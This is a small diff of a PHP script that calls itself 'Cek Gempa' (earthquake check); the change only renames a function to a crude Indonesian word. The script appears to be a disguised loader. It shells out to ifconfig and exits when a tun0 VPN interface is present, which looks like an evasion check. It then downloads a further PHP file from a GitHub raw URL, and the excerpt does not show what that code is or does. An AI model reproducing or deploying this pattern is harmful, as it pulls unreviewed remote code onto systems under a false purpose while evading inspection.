@@ -1,6 +1,6 @@
 <?php
 
-function sockkkk(){
+function kontol(){
   $sistemm=shell_exec('2>/dev/null ifconfig');
     
    if(preg_match('/tun0/i',$sistemm)){
@@ -9,7 +9,7 @@ function sockkkk(){
         exit;
         }
     }
-    sockkkk();
+    kontol();
 const script = "Cek Gempa";
 
 $function = file_get_contents("https://raw.githubusercontent.com/Bagusivo1999/fullscript/refs/heads/main/curlku.php");
